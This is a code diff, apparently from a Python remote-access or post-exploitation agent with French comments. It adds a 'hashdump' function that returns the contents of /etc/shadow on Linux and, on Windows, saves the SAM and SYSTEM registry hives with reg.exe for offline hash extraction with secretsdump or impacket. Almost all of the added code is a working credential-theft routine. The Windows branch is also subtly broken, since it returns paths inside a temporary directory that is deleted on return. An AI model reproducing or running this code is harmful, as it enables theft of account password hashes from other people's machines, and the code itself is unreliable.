@@ -174,3 +174,73 @@ def get_system_info() -> str:
         check=False,
     )
     return result.stdout.strip() or result.stderr.strip() or "Aucune sortie"
+
+
+# ---------------------------------------------------------------------------
+# hashdump — récupération des hashes de mots de passe
+# ---------------------------------------------------------------------------
+
+
+def hashdump() -> str:
+    """
+    Retrieve password hashes depending on the OS.
+
+    - Linux   : reads /etc/shadow (requires root privileges)
+    - Windows : saves SAM and SYSTEM hives via reg.exe
+                (requires Administrator privileges)
+
+    Returns:
+        str: Shadow file content, saved hive paths, or an error message.
+    """
+    import subprocess
+    import tempfile
+    from pathlib import Path
+
+    os_name = _get_os()
+
+    if os_name == "Linux":
+        shadow_path = Path("/etc/shadow")
+        try:
+            content = shadow_path.read_text(encoding="utf-8")
+            logger.info("hashdump Linux: %d lines retrieved", content.count("\n"))
+            return content
+        except PermissionError:
+            logger.warning("hashdump: permission denied for %s (root required)", shadow_path)
+            return f"Error: permission denied to read {shadow_path} (root required)"
+        except FileNotFoundError:
+            return f"Error: {shadow_path} not found"
+        except Exception as exc:
+            logger.exception("hashdump Linux error: %s", exc)
+            return f"Error: {exc}"
+
+    elif os_name == "Windows":
+        try:
+            with tempfile.TemporaryDirectory() as tmpdir:
+                sam_path = str(Path(tmpdir) / "SAM")
+                system_path = str(Path(tmpdir) / "SYSTEM")
+
+                # Saves hives 
+                for hive, dest in [("HKLM\\SAM", sam_path), ("HKLM\\SYSTEM", system_path)]:
+                    result = subprocess.run(
+                        ["reg", "save", hive, dest, "/y"],
+                        capture_output=True,
+                        text=True,
+                        check=False,
+                    )
+                    if result.returncode != 0:
+                        logger.warning("hashdump Windows error on %s: %s", hive, result.stderr.strip())
+                        return f"Error saving {hive}: {result.stderr.strip()}"
+
+                logger.info("hashdump Windows: SAM and SYSTEM hives saved")
+                return (
+                    f"Hives saved:\n"
+                    f"  SAM    -> {sam_path}\n"
+                    f"  SYSTEM -> {system_path}\n"
+                    "(Binary files — use secretsdump or impacket to extract hashes)"
+                )
+        except Exception as exc:
+            logger.exception("hashdump Windows error: %s", exc)
+            return f"Error: {exc}"
+
+    else:
+        return f"Unsupported OS for hashdump: {os_name}"
